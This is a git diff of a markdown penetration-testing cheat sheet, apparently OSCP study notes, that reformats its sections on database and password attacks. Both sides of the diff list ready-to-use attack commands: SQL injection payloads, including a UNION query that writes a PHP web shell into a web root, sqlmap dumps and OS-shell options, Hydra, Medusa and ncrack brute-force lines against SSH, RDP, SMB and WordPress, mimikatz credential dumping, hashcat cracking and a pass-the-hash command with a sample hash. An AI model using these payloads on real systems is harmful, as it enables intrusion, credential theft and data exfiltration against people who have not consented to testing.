@@ -77,7 +77,18 @@
     - [Client Attacks](#client-attacks)
     - [Web Attacks](#web-attacks)
   - [File Inclusion Vulnerabilities](#file-inclusion-vulnerabilities)
-    - [Database Vulnerabilities](#database-vulnerabilities)
+  - [Database Vulnerabilities](#database-vulnerabilities)
+    - [Detecting SQL Injection Vulnerabilities.](#detecting-sql-injection-vulnerabilities)
+    - [SQLMap Examples](#sqlmap-examples)
+    - [NoSQLMap Examples](#nosqlmap-examples)
+  - [Password Attacks](#password-attacks)
+    - [Brute Force](#brute-force)
+    - [Dictionary Files](#dictionary-files)
+    - [Windows Credential Editor (WCE)](#windows-credential-editor-wce)
+    - [Hydra](#hydra)
+    - [Password Hash Attacks](#password-hash-attacks)
+      - [Hashcat](#hashcat)
+      - [Passing the Hash in Windows](#passing-the-hash-in-windows)
   - [Networking, Pivoting and Tunneling](#networking-pivoting-and-tunneling)
   - [The Metasploit Framework](#the-metasploit-framework)
   - [Bypassing Antivirus Software](#bypassing-antivirus-software)
@@ -90,7 +101,7 @@
       - [LM Hashes](#lm-hashes)
     - [Windows Credencial Editor (WCE)](#windows-credencial-editor-wce)
     - [VNC](#vnc)
-  - [Tcp-dump on windows](#tcp-dump-on-windows)
+  - [TCP-dump on windows](#tcp-dump-on-windows)
     - [Meterpreter](#meterpreter-1)
   - [Recursive search](#recursive-search)
   - [Loot Linux](#loot-linux)
@@ -2738,7 +2749,7 @@ drupscan
 
 joomscan
 
-### Database Vulnerabilities
+## Database Vulnerabilities
 
 - Playing with SQL Syntax
     A great tool I have found for playing with SQL Syntax for a variety of database types (MSSQL Server, MySql, PostGreSql, Oracle) is SQL Fiddle:
@@ -2749,426 +2760,296 @@ joomscan
 
     <http://rextester.com/l/mysql_online_compiler>
 
-- Detecting SQL Injection Vulnerabilities.
+### Detecting SQL Injection Vulnerabilities.
 
-         Most modern automated scanner tools use time delay techniques to detect SQL injection vulnerabilities.  This method can tell you if a SQL injection vulnerability is present even if it is a "blind" sql injection vulnerabilit that does not provide any data back.  You know your SQL injection is working when the server takes a LOooooong time to respond.  I have added a line comment at the end of each injection statement just in case there is additional SQL code after the injection point.
+Most modern automated scanner tools use time delay techniques to detect SQL injection vulnerabilities.  This method can tell you if a SQL injection vulnerability is present even if it is a "blind" sql injection vulnerabilit that does not provide any data back.  You know your SQL injection is working when the server takes a LOooooong time to respond.  I have added a line comment at the end of each injection statement just in case there is additional SQL code after the injection point.
 
-  - **MSSQL Server SQL Injection Time Delay Detection:**
-        Add a 30 second delay to a MSSQL Server Query
+1. MSSQL Server SQL Injection Time Delay Detection:
+- Add a 30 second delay to a MSSQL Server Query
+  - *Original Query* `SELECT * FROM products WHERE name='Test';`
+  - *Injection Value* `'; WAITFOR DELAY '00:00:30'; --`
+  - *Resulting Query* `SELECT * FROM products WHERE name='Test'; WAITFOR DELAY '00:00:30'; --`
+  
+2. MySQL Injection Time Delay Detection:
+- Add a 30 second delay to a MySQL Query
+   - *Original Query* `SELECT * FROM products WHERE name='Test';`
+   - *Injection Value* `'-SLEEP(30); #`
+   - *Resulting Query* `SELECT * FROM products WHERE name='Test'-SLEEP(30); #`
 
-    - *Original Query*
+3. PostGreSQL Injection Time Delay Detection:
+- Add a 30 second delay to an PostGreSQL Query
+  - *Original Query* `SELECT * FROM products WHERE name='Test';`
+  - *Injection Value* `'; SELECT pg_sleep(30); --`
+  - *Resulting Query* `SELECT * FROM products WHERE name='Test'; SELECT pg_sleep(30); --`
 
-            `SELECT * FROM products WHERE name='Test';`
+- Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and password 
 
-    - *Injection Value*
-
-            `'; WAITFOR DELAY '00:00:30'; --`
-
-    - *Resulting Query*
-
-            `SELECT * FROM products WHERE name='Test'; WAITFOR DELAY '00:00:30'; --`
-
-  - **MySQL Injection Time Delay Detection:**
-        Add a 30 second delay to a MySQL Query
-
-    - *Original Query*
-
-            `SELECT * FROM products WHERE name='Test';`
-
-    - *Injection Value*
-
-            `'-SLEEP(30); #`
-
-    - *Resulting Query*
-
-            `SELECT * FROM products WHERE name='Test'-SLEEP(30); #`
-
-  - **PostGreSQL Injection Time Delay Detection:**
-        Add a 30 second delay to an PostGreSQL Query
-
-    - *Original Query*
-
-            `SELECT * FROM products WHERE name='Test';`
-
-    - *Injection Value*
-
-            `'; SELECT pg_sleep(30); --`
-
-    - *Resulting Query*
-
-            `SELECT * FROM products WHERE name='Test'; SELECT pg_sleep(30); --`
-
-- Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and        password  
-
-              mysql -u root -p -h $ip
-              use "Users"  
-              show tables;  
-              select \* from users;
+  ```
+  mysql -u root -p -h $ip
+  use "Users"  
+  show tables;  
+  select \* from users;
+  ```
 
 - Authentication Bypass  
-
-              name='wronguser' or 1=1;  
-              name='wronguser' or 1=1 LIMIT 1;
+  - `name='wronguser' or 1=1;`
+  - `name='wronguser' or 1=1 LIMIT 1;`
 
 - Enumerating the Database  
+  - `http://192.168.11.35/comment.php?id=738)'`  
+- Verbose error message?  
+  - `http://$ip/comment.php?id=738 order by 1`
+  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6`
+- Determine MySQL Version:  
+  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6`
+- Current user being used for the database connection:
+  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6`
+- Enumerate database tables and column structures  
+  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables`
+- Target the users table in the database  
+  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'`
+- Extract the name and password  
+  - `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users`
+- Create a backdoor
+  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
 
-        `http://192.168.11.35/comment.php?id=738)'`  
-
-        Verbose error message?  
-
-        `http://$ip/comment.php?id=738 order by 1`
-
-        `http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6`
-
-        Determine MySQL Version:  
-
-        `http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6`
-
-        Current user being used for the database connection:
-
-        `http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6`
-
-        Enumerate database tables and column structures  
-
-        `http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables`
-
-        Target the users table in the database  
-
-        `http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where        table_name='users'`
-
-        Extract the name and password  
-
-        `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users`
-
-        Create a backdoor
-
-        `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE        'c:/xampp/htdocs/backdoor.php'`
-
-- **SQLMap Examples**
+### SQLMap Examples
 
 - Crawl the links
-
-         `sqlmap -u http://$ip --crawl=1`
-
-         `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
+  - `sqlmap -u http://$ip --crawl=1`
+  - `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
 
 - SQLMap Search for databases against a suspected GET SQL Injection
-
-        `sqlmap –u http://$ip/blog/index.php?search –dbs`
+  - `sqlmap –u http://$ip/blog/index.php?search –dbs`
 
 - SQLMap dump tables from database oscommerce at GET SQL injection
-
-        `sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps`
+  - `sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps`
 
 - SQLMap GET Parameter command  
-
-         `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5`
+  - `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5`
 
 - SQLMap Post Username parameter
-
-          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all`
+  - `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all`
 
 - SQL Map OS Shell
-
-          `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell`
-
-          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell`
+  - `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell`
+  - `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell`
 
 - Automated sqlmap scan
+  - `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"`
 
-          `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"`
+- Targeted sqlmap scan
+  - `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`
 
-        - Targeted sqlmap scan
-        
-           `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`
-             
-         - Scan url for union + error based injection with mysql backend and use a random user agent + database dump  
+- Scan url for union + error based injection with mysql backend and use a random user agent + database dump  
+  - `sqlmap -o -u http://$ip/index.php --forms --dbs  `
+  - `sqlmap -o -u "http://$ip/form/" --forms`
+  
+- Sqlmap check form for injection  
+  - `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
+   
+- Enumerate databases  
+  - `sqlmap --dbms=mysql -u "$URL" --dbs`
+  
+- Enumerate tables from a specific database  
+  - `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
+    
+- Dump table data from a specific database and table  
+  - `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
+     
+- Specify parameter to exploit  
+  - `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
+      
+- Specify parameter to exploit in 'nice' URIs (exploits param1)
+  - `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
+       
+- Get OS shell  
+  - `sqlmap --dbms=mysql -u "$URL" --os-shell`
          
-            `sqlmap -o -u http://$ip/index.php --forms --dbs  `
-               
-            `sqlmap -o -u "http://$ip/form/" --forms`
-                
-          - Sqlmap check form for injection  
+- Get SQL shell  
+  - `sqlmap --dbms=mysql -u "$URL" --sql-shell`
           
-             `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
-                 
-           - Enumerate databases  
+- SQL query  
+  - `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
            
-              `sqlmap --dbms=mysql -u "$URL" --dbs`
-                
-            - Enumerate tables from a specific database  
-                  
-              `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
-                  
-            - Dump table data from a specific database and table  
-            
-               `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
-                   
-            - Specify parameter to exploit  
-             
-               `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
-                    
-            - Specify parameter to exploit in 'nice' URIs (exploits param1)
-             
-                `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
-                     
-            - Get OS shell  
-              
-                 `sqlmap --dbms=mysql -u "$URL" --os-shell`
-                       
-            - Get SQL shell  
-                       
-                 `sqlmap --dbms=mysql -u "$URL" --sql-shell`
-                        
-             - SQL query  
-                
-                `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
-                         
-             - Use Tor Socks5 proxy  
-                 
-                `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
+- Use Tor Socks5 proxy  
+  - `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
 
-- **NoSQLMap Examples**
-       You may encounter NoSQL instances like MongoDB in your OSCP journies (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration.
+
+### NoSQLMap Examples
+
+You may encounter NoSQL instances like MongoDB in your OSCP journies (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration.
 
 - NoSQLMap Installation
 
-        ```shell
-        git clone https://github.com/codingo/NoSQLMap.git
-        cd NoSQLMap/
-        ls
-        pip install couchdb
-        pip install pbkdf2
-        pip install ipcalc
-        python nosqlmap.py
-        ```
+  ```shell
+  git clone https://github.com/codingo/NoSQLMap.git
+  cd NoSQLMap/
+  ls
+  pip install couchdb
+  pip install pbkdf2
+  pip install ipcalc
+  python nosqlmap.py
+  ```
 
 - Often you can create an exception dump message with MongoDB using a malformed NoSQLQuery such as:
-
-      `a'; return this.a != 'BadData’'; var dummy='!`
-
-- Password Attacks
-  - AES Decryption  
-        <http://aesencryption.net/>
-
-  - Convert multiple webpages into a word list
-
-      ```shell
-      for x in 'index' 'about' 'post' 'contact' ; do \
-      curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
-      done
-      ```
-
-  - Or convert html to word list dict  
-        `html2dic index.html.out | sort -u > index-html.dict`
-
-  - Default Usernames and Passwords
-
-    - CIRT  
-            [*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)
-
-    - Government Security - Default Logins and Passwords for
-            Networked Devices
-
-    - [*http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php*](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)
-
-    - Virus.org  
-            [*http://www.virus.org/default-password/*](http://www.virus.org/default-password/)
-
-    - Default Password  
-            [*http://www.defaultpassword.com/*](http://www.defaultpassword.com/)
-
-  - Brute Force
-
-    - Nmap Brute forcing Scripts  
-            [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)
-
-    - Nmap Generic auto detect brute force attack:
-            `nmap --script brute -Pn <target.com or ip>`
-
-    - MySQL nmap brute force attack:
-            `nmap --script=mysql-brute $ip`
-
-  - Dictionary Files
-
-    - Word lists on Kali  
-            `cd /usr/share/wordlists`
-
-  - Key-space Brute Force
-
-    - `crunch 6 6 0123456789ABCDEF -o crunch1.txt`
-
-    - `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha`
-
-    - `crunch 8 8 -t ,@@^^%%%`
-
-  - Pwdump and Fgdump - Security Accounts Manager (SAM)
-
-    - `pwdump.exe` - attempts to extract password hashes
-
-    - `fgdump.exe` - attempts to kill local antiviruses before
-            attempting to dump the password hashes and
-            cached credentials.
-
-  - Windows Credential Editor (WCE)
-
-    - allows one to perform several attacks to obtain clear text
-            passwords and hashes. Usage: `wce -w`
-
-  - Mimikatz
-
-    - extract plaintexts passwords, hash, PIN code and kerberos
-            tickets from memory. mimikatz can also perform
-            pass-the-hash, pass-the-ticket or build Golden tickets  
-            [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
-            From metasploit meterpreter (must have System level access):
-
-            ```
-            meterpreter> load mimikatz
-            meterpreter> help mimikatz
-            meterpreter> msv
-            meterpreter> kerberos
-            meterpreter> mimikatz_command -f samdump::hashes
-            meterpreter> mimikatz_command -f sekurlsa::searchPasswords
-            ```
-
-  - Password Profiling
-
-    - cewl can generate a password list from a web page  
-            `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
-
-  - Password Mutating
-
-    - John the ripper can mutate password lists  
-            nano /etc/john/john.conf  
-            `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`
-
-  - Medusa
-
-    - Medusa, initiated against an htaccess protected web
-            directory  
-            `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`
-
-  - Ncrack
-
-    - ncrack (from the makers of nmap) can brute force RDP  
-            `ncrack -vv --user offsec -P password-file.txt rdp://$ip`
-
-  - Hydra
-
-    - Hydra brute force against SNMP  
-
-            `hydra -P password-file.txt -v $ip snmp`
-
-    - Hydra FTP known user and rockyou password list  
-
-            `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`
-
-    - Hydra SSH using list of users and passwords  
-
-            `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`
-
-    - Hydra SSH using a known password and a username list  
-
-            `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`
-
-    - Hydra SSH Against Known username on port 22
-
-            `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`
-
-    - Hydra POP3 Brute Force  
-
-            `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`
-
-    - Hydra SMTP Brute Force  
-
-            `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`
-
-    - Hydra attack http get 401 login with a dictionary  
-
-            `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`
-
-    - Hydra attack Windows Remote Desktop with rockyou
-
-            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`
-
-    - Hydra brute force SMB user with rockyou:
-
-            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`
-
-    - Hydra brute force a Wordpress admin login ( wpscan will do it too )
-
-            `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
-
-- Password Hash Attacks
-
-  - Online Password Cracking  
-        [*https://crackstation.net/*](https://crackstation.net/)
-        [*http://finder.insidepro.com/*](http://finder.insidepro.com/)
-
-  - Hashcat
-    Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.
-
-      `apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev`
-      and
-      `apt-get install pocl-opencl-icd`
-
-    - Cracking Linux Hashes - /etc/shadow file
-
-      ```text
-      500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
-      3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
-      7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
-      1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
-      ```
-
-    - Cracking Windows Hashes
-
-      ```text
-      3000 | LM                                               | Operating-Systems
-      1000 | NTLM                                             | Operating-Systems
-      ```
-
-    - Cracking Common Application Hashes
-
-    ```text
-      900 | MD4                                              | Raw Hash
-        0 | MD5                                              | Raw Hash
-     5100 | Half MD5                                         | Raw Hash
-      100 | SHA1                                             | Raw Hash
-    10800 | SHA-384                                          | Raw Hash
-     1400 | SHA-256                                          | Raw Hash
-     1700 | SHA-512                                          | Raw Hash
+  - `a'; return this.a != 'BadData’'; var dummy='!`
+
+## Password Attacks
+
+- AES Decryption <http://aesencryption.net/>
+- Convert multiple webpages into a word list
+    ```shell
+    for x in 'index' 'about' 'post' 'contact' ; do \
+    curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
+    done
     ```
+- Or convert html to word list dict `html2dic index.html.out | sort -u > index-html.dict`
+- Default Usernames and Passwords
+- CIRT [*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)
+- Government Security - Default Logins and Passwords for Networked Devices
+  - [*http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php*](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)
+- Virus.org [*http://www.virus.org/default-password/*](http://www.virus.org/default-password/)
+- Default Password [*http://www.defaultpassword.com/*](http://www.defaultpassword.com/)
 
-    Create a .hash file with all the hashes you want to crack puthasheshere.hash:
-    `$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`
+### Brute Force
 
-    Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:
+- Nmap Brute forcing Scripts  
+  - [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)
+- Nmap Generic auto detect brute force attack:
+  - `nmap --script brute -Pn <target.com or ip>`
+- MySQL nmap brute force attack:
+  - `nmap --script=mysql-brute $ip`
 
-    `hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt`
+### Dictionary Files
 
-    Wordpress sample hash: `$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`
+- Word lists on Kali `cd /usr/share/wordlists`
+- Key-space Brute Force
+  - `crunch 6 6 0123456789ABCDEF -o crunch1.txt`
+  - `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha`
+  - `crunch 8 8 -t ,@@^^%%%`
+- Pwdump and Fgdump - Security Accounts Manager (SAM)
+  - `pwdump.exe` - attempts to extract password hashes
+  - `fgdump.exe` - attempts to kill local antiviruses before attempting to dump the password hashes and cached credentials.
 
-    Wordpress clear text: `test`
+### Windows Credential Editor (WCE)
 
-    Hashcat example cracking Wordpress passwords using rockyou:
+- allows one to perform several attacks to obtain clear text passwords and hashes. Usage: `wce -w`
+- Mimikatz
+- extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets 
+  [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
+  From metasploit meterpreter (must have System level access):
 
-      `hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt`
+  ```
+  meterpreter> load mimikatz
+  meterpreter> help mimikatz
+  meterpreter> msv
+  meterpreter> kerberos
+  meterpreter> mimikatz_command -f samdump::hashes
+  meterpreter> mimikatz_command -f sekurlsa::searchPasswords
+  ```
 
-  - Sample Hashes  
-        [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)
+- Password Profiling
+  - cewl can generate a password list from a web page `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
 
-  - Identify Hashes  
+- Password Mutating
+  - John the ripper can mutate password lists:
+    - `nano /etc/john/john.conf`
+    - `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`
 
-        `hash-identifier`
+- Medusa
+  - Medusa, initiated against an htaccess protected web directory `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`
 
-  - To crack linux hashes you must first unshadow them:  
+- Ncrack
+  - ncrack (from the makers of nmap) can brute force RDP `ncrack -vv --user offsec -P password-file.txt rdp://$ip`
 
-        `unshadow passwd-file.txt shadow-file.txt`
+### Hydra
 
-        `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
+- Hydra brute force against SNMP  
+  - `hydra -P password-file.txt -v $ip snmp`
 
+- Hydra FTP known user and rockyou password list  
+  - `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`
+
+- Hydra SSH using list of users and passwords  
+  - `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`
+
+- Hydra SSH using a known password and a username list  
+  - `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`
+
+- Hydra SSH Against Known username on port 22
+  - `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`
+
+- Hydra POP3 Brute Force  
+  - `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`
+
+- Hydra SMTP Brute Force  
+  - `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`
+
+- Hydra attack http get 401 login with a dictionary  
+  - `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`
+
+- Hydra attack Windows Remote Desktop with rockyou
+  - `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`
+
+- Hydra brute force SMB user with rockyou:
+  - `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`
+
+- Hydra brute force a Wordpress admin login ( wpscan will do it too )
+  - `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
+
+### Password Hash Attacks
+
+- Online Password Cracking  
+      [*https://crackstation.net/*](https://crackstation.net/)
+      [*http://finder.insidepro.com/*](http://finder.insidepro.com/)
+
+#### Hashcat
+
+Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.
+- `apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev` and
+- `apt-get install pocl-opencl-icd`
+- Cracking Linux Hashes - /etc/shadow file
+
+  ```text
+  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
+  3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
+  7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
+  1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
+  ```
+
+- Cracking Windows Hashes
+
+  ```text
+  3000 | LM                                               | Operating-Systems
+  1000 | NTLM                                             | Operating-Systems
+  ```
+
+- Cracking Common Application Hashes
+
+```text
+  900 | MD4                                              | Raw Hash
+    0 | MD5                                              | Raw Hash
+ 5100 | Half MD5                                         | Raw Hash
+  100 | SHA1                                             | Raw Hash
+10800 | SHA-384                                          | Raw Hash
+ 1400 | SHA-256                                          | Raw Hash
+ 1700 | SHA-512                                          | Raw Hash
+```
+
+- Create a .hash file with all the hashes you want to crack puthasheshere.hash:
+  - `$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`
+- Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:
+  - `hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt`
+- Wordpress sample hash: `$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`
+- Wordpress clear text: `test`
+- Hashcat example cracking Wordpress passwords using rockyou:
+  - `hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt`
+- Sample Hashes [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)
+- Identify Hashes `hash-identifier`
+- To crack linux hashes you must first unshadow them:  
+  - `unshadow passwd-file.txt shadow-file.txt`
+  - `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
 - John the Ripper - Password Hash Cracking
   - `john $ip.pwdump`
   - `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`
@@ -3179,13 +3060,11 @@ joomscan
   - JTR forced descrypt brute force cracking  
         `john --format=descrypt hash --show`
 
-- Passing the Hash in Windows
-  - Use Metasploit to exploit one of the SMB servers in the labs.
-        Dump the password hashes and attempt a pass-the-hash attack
-        against another system:  
-        `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896`
-
-        `pth-winexe -U administrator //$ip cmd`
+#### Passing the Hash in Windows
+- Use Metasploit to exploit one of the SMB servers in the labs.
+  - Dump the password hashes and attempt a pass-the-hash attack against another system:  
+    - `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896`
+    - `pth-winexe -U administrator //$ip cmd`
 
 ## Networking, Pivoting and Tunneling
 
@@ -3664,7 +3543,7 @@ set session X
 exploit
 ```
 
-## Tcp-dump on windows
+## TCP-dump on windows
 
 You can use meterpreter to easily take a tcp-dump, like this:
 
@@ -3689,8 +3568,7 @@ You can use meterpreter to easily take a tcp-dump, like this:
 
 ## Recursive search
   
-`dir /s`
-
+- `dir /s`
 References: This is a great post <https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/>
 In older versions of windows there is a directory called repair, there you will find the backup of sam and system, we can copy then and use samdump2 to make a file containig those hashes and crack with john
 
